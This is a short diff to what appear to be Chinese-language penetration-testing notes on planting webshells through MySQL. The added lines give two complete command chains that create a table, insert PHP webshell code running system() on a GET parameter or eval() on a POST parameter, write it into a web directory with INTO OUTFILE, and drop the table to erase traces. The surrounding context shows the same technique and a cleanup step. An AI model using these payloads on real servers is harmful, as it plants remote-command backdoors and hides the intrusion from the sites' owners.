@@ -38,6 +38,12 @@ select 'webshell' from 'shell'  into outfile 'c:\\1.php';
 
 4.删除表，清理痕迹。
 drop table if exists 'shell';
+
+汇总：
+1.
+use mysql;create table x(packet text) type=MYISaM;insert into x (packet) values('<pre><body ><?php @system($_GET["cmd"]); ?></body></pre>')select x  into outfile 'd:\php\xx.php'
+2.
+Create TABLE study (cmd text NOT NULL);Insert INTO study (cmd) VALUES('<?php eval ($_POST[cmd]) ?>');select cmd from study into outfile 'D:/php/www/htdocs/test/seven.php';Drop TABLE IF EXISTS study;
 ```
 
 mysql日志写shell
